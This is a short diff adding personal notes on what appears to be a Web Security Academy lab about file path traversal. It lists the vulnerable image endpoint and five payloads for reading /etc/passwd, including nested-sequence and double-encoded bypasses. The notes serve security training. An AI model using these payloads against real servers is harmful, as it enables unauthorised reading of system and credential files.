@@ -1,0 +1,12 @@
+url: https://0a8a00be034f79c2826333a3000a00e1.web-security-academy.net
+vulnerable path: /image?filename=1.jpg
+attack type: File path traversal
+Analysis: {
+file location: /var/www/images/65.png 
+passwd location: /var/www/images/../../../etc/passwd
+}
+payload:1) filename= ../../../etc/passwd
+2) filename= /etc/passwd
+3) filename = ....//....//....//etc/passwd
+4) ..%252f..%252f..%252fetc/passwd
+5) /var/www/images/../../../etc/passwd
